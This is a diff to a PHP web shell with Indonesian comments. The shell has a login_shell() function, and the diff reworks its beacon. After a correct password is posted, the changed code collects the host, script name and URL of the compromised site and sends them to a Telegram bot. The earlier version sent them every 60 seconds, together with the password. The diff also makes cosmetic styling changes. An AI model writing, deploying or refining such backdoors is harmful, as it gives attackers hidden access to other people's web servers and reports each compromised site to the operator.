@@ -25,31 +25,26 @@ function sendTelegramMessage($message) {
     file_get_contents($url); // Kirim pesan
 }
 
-// Jeda pengiriman pesan (dalam detik)
-$send_interval = 60; // 60 detik
+// Cek jika ada password yang di-submit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input_password = $_POST['password'];
 
-// Cek waktu terakhir pengiriman
-if (!isset($_SESSION['last_sent_time'])) {
-    $_SESSION['last_sent_time'] = 0;
-}
+    if ($input_password === $correct_password) {
+        // Ambil informasi keberadaan bot
+        $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
+        $script_name = "Nama Skrip: " . $_SERVER['SCRIPT_NAME'] . "\n";
+        $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
 
-$current_time = time();
-if ($current_time - $_SESSION['last_sent_time'] >= $send_interval) {
-    // Ambil informasi keberadaan bot
-    $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
-    $script_name = "Script Name: " . $_SERVER['SCRIPT_NAME'] . "\n";
-    $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
+        // Buat pesan
+        $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
 
-    // Buat pesan
-    $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url . "Password: " . $password;
+        // Kirim pesan
+        sendTelegramMessage($message);
 
-    // Kirim pesan
-    sendTelegramMessage($message);
-
-    // Update waktu terakhir pengiriman
-    $_SESSION['last_sent_time'] = $current_time;
-} else {
-    echo "Pesan sudah dikirim. Tunggu sebelum mengirim lagi.";
+        echo "Pesan berhasil dikirim.";
+    } else {
+        echo "Password salah. Silakan coba lagi.";
+    }
 }
 function login_shell() {
     ?>
@@ -66,7 +61,7 @@ function login_shell() {
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://wallpapercave.com/uwp/uwp4541619.jpeg');
+            background-image: url('https://wallpapercave.com/wp/wp5768602.jpg');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
@@ -814,7 +809,7 @@ body {
     background-position: center; /* Memposisikan gambar di tengah */
     height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
     font-family:        Verdana, Arial, Helvetica, sans-serif;
-    font-size:          8pt;
+    font-size:          10pt;
     margin:             0px;
 }
 
